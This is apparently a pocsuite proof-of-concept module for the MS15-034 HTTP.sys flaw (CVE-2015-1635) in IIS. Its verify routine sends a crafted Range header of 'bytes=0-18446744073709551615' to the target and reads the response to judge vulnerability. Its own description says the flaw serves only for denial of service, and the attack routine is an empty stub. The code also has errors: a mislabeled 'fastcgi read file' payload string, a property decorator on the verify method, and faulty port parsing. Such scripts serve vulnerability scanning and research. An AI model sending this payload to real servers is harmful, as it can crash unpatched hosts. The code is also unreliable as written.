#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Copyright (c) 2014-2015 pocsuite developers (http://seebug.org)
See the file 'docs/COPYING' for copying permission
"""
#命令行
from pocsuite import pocsuite_cli
#验证模块
from pocsuite import pocsuite_verify
#攻击模块
from pocsuite import pocsuite_attack
#控制台模式
from pocsuite import pocsuite_console
#requests
from pocsuite.api.request import req
#register
from pocsuite.api.poc import register
#report
from pocsuite.api.poc import Output, POCBase
#url转换host
from pocsuite.lib.utils.funs import url2ip



#基础基类
#fastcgi
class MSPOC(POCBase):
    vulID = '54'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1' #默认为1
    vulDate = '2018-09-18' #漏洞公开的时间,不知道就写今天

    author = 'wanglin' #  PoC作者的大名
    createDate ='2018-09-18'# 编写 PoC 的日期
    updateDate = '2018-09-18'# PoC 更新的时间,默认和编写时间一样
    references = ['']# 漏洞地址来源,0day不用写
    name = 'HTTP.sys RCE(only DOS) CVE-2015-1635'# PoC 名称
    appPowerLink = 'https://www.microsoft.com/'# 漏洞厂商主页地址
    appName = 'Microsoft'# 漏洞应用名称
    appVersion = 'all versions'# 漏洞影响版本
    vulType = 'cmd-exec'#漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
    MS15-034 HTTP.sys 远程代码执行（CVE-2015-1635）目前仅能作为DOS攻击
    ''' # 漏洞简要描述
    samples = []# 测试样列,就是用 PoC 测试成功的网站
    install_requires = ['socket'] # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    cvss = u"严重" #严重,高危,中危,低危

    #指纹方法
    def _fingerprint(self):
        pass


    @property
    def _verify(self):
        result = {}
        output = Output(self)

        # ip
        ip = url2ip(self.url)

        #port
        import re
        _port = re.findall(':(\d+)\s*', self.url)
        if len(_port) != 0:
            _port = url2ip(self.url)[1]
        else:
            _port = 80


        import socket

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2.0)
        sock.connect((ip,int(_port)))  # ip port
        flag = "GET / HTTP/1.0\r\nHost: stuff\r\nRange: bytes=0-18446744073709551615\r\n\r\n"
        sock.send(flag)
        try:
            data = sock.recv(1024)
            if 'Requested Range Not Satisfiable' in data and 'Server: Microsoft' in data:
                result['VerifyInfo'] = {}

                result['VerifyInfo']['url'] = ip
                result['VerifyInfo']['Payload'] = ip + 'fastcgi read file vul'

                return self.save_output(result)

        except:
            print '连接失败'
            pass

        sock.close()
        # print '-' * 18 + '\n'
        print data
        # print '-' * 18 + '\n'



    #攻击模块
    def _attack(self):
        pass

    #输出报告
    def save_output(self, result):
        #判断有无结果并输出
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output


#注册类
register(MSPOC)